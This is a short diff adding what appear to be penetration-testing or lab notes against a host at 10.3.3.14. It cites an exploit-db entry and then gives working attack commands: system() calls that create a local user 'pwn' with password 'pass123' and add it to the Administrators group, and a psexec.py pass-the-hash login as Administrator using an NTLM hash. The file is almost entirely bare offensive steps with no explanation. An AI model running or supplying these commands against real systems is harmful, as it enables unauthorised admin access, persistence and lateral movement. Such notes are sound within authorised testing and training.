@@ -1,0 +1,6 @@
+http://10.3.3.14/dev/ - https://www.exploit-db.com/exploits/38901
+
+system('net user pwn pass123 /add');
+system('net localgroup Administrators pwn /add');
+
+psexec.py Administrator@10.3.3.14 -hashes :81705f25df71d547b2f658fbfd11885d
